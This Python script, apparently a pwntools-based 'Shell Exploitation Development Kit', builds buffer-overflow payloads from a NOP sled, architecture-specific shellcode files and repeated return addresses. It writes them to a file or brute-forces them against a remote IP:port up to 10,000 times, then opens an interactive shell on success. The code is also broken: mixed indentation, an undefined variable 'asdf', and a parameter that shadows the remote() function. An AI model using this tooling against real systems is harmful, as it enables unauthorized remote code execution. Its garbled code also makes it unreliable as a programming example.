from pwnlib import *
from pwn import *
import argparse
import struct
import os
import sys

os_types = ["linux", "windows", "freebsd", "bsd", "BSD", "Linux"]
binuti_is = {"ppc64" : 'powerpc64', "ppc": 'powerpc',  "mips64": 'mips64', "thumb":'thumb', "amd64" : 'amd64', "x86":'i386', "mips":'mips', "x86_64" : 'ia64', "arm": 'arm' }
shells = {"ppc":"ppc.shell", "ppc64":"ppc.shell", "mips":"mips.shell", "mips64":"mips.shell", "x86_64":"lin64.shell", "x86":"lin86.shell", "arm":"arm.shell"}

class SXDK(Exception):
    pass

class GenerateShellcode:
    def __init__(self, num_of_addresses, total_size, operating_system, architecture, starting_address, offset, endianness):
        self.num_of_addresses = num_of_addresses
        self.total_size = total_size
        self.operating_system = operating_system
        self.architecture = int(architecture)
        self.starting_address = starting_address
        self.offset = offset
        self.endianness = endianness.lower()
        self.data = None
        self.instruction_set = None
        self.shell_os = None
    def parse_inputs(self):
        self.starting_address = int(self.starting_address, 16)
        if '/' in self.operating_system:
            self.shell_os, self.instruction_set = self.operating_system.split('/')
        else:
            raise SXDK("Input to Operating_system field was wrong.")
        if self.instruction_set.lower() in binuti_is:
            context.arch = binuti_is[self.instruction_set.lower()]
        else:
            raise SXDK("Input into operating_system is wrong.")
        if not self.shell_os.lower() in os_types:
            raise SXDK("Input into operating_system is wrong.")
        context.os = self.shell_os.lower()
        self.shell_os = self.shell_os.lower()
        if self.architecture != 32 and self.architecture != 64:
            raise SXDK("Input into architecture is wrong.")
        context.bits = self.architecture
        if "little" in self.endianness or "big" in self.endianness:
            context.endian = self.endianness
        else:
            raise SXDK("Input into endianness is wrong.")
        if "little" in self.endianness:
            self.endian_flag = "<L"
        else:
            self.endian_flag = ">L"

        temp_size = self.total_size - (4*self.num_of_addresses)
        shellcode_file = open(shells[self.instruction_set.lower()], "r")
        self.shell_data = shellcode_file.read()
        self.shellcode_size= os.path.getsize(shells[self.instruction_set.lower()])
        temp_size = temp_size - self.shellcode_size
        self.total_nop = temp_size
    def write_file(self, name):
        f = open(name, "w")
        f.write("{0}{1}{2}\x0A".format(asm('nop')*(self.total_nop//len(asm('nop'))), self.shell_data, struct.pack(self.endian_flag,self.starting_address)*self.num_of_addresses))

        #f.close()
    def remote(self, remote):

        ip_addr, port = remote.split(':')
        for i in xrange(0,10000):
            s = remote(ip_addr, int(port))
            s.send("{0}{1}{2}\x0A".format(asm('nop')*(self.total_nop//len(asm('nop'))), self.shell_data, struct.pack(self.endian_flag,hex( int(self.starting_address, 16) - i*self.total_nop )[2:])*self.num_of_addresses))
	        try:
		        connection_output =  s.recv(1024)
		        print connection_output
	        except:
		        pass
            if asdf:
                try:
		            s.interactive()
                except:
                    pass
	        s.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shell Exploitation Development Kit")
    parser.add_argument("-f", "--num_of_addresses", type=int, help="Number of addresses at the end of the egg.")
    parser.add_argument("-t", "--total_size", type=int, help="The total size of your egg.")
    parser.add_argument("-o", "--operating_system", type=str, default="linux/x86", help="The OS of your system. Ex. Linux/PPC, Linux/x86, Linux/x86_64 ")
    parser.add_argument("-a", "--architecture", type=int, default=32, help="32 or 64 bit depending upon the machine.") #This changes the relative offsets and shellcode.
    parser.add_argument("-s", "--starting_address", type=str, help="The starting address for your system based upon your stack.")
    parser.add_argument("-e", "--endianness", type=str, default="little", help="The endianness of your program. EX. little, big")
    parser.add_argument("-d", "--offset", type=int, default=0, help="The offset relative to the address. Utilized for guessing multiple spaces.") #Future release to have automated guesses.
    parser.add_argument("-n", "--name_of_file", type=str, default="egg.out", help="Name of the output file.")
    parser.add_argument("-r", "--remote", type=str, help="Connects and sends data to a remote endpoint. Format: IPADDR:PORT")
    parser.add_argument("-b", "--binary", type=str, help="path to the binary that is to be exploited.")
    args = parser.parse_args()
    if not args.starting_address and not args.num_of_addresses and not args.total_size:
        parser.print_help()
        quit()
    genshell = GenerateShellcode(args.num_of_addresses, args.total_size, args.operating_system, args.architecture, args.starting_address, args.offset, args.endianness)
    try:
        genshell.parse_inputs()
    except:
        pass
    #end
    genshell.write_file(args.name_of_file)
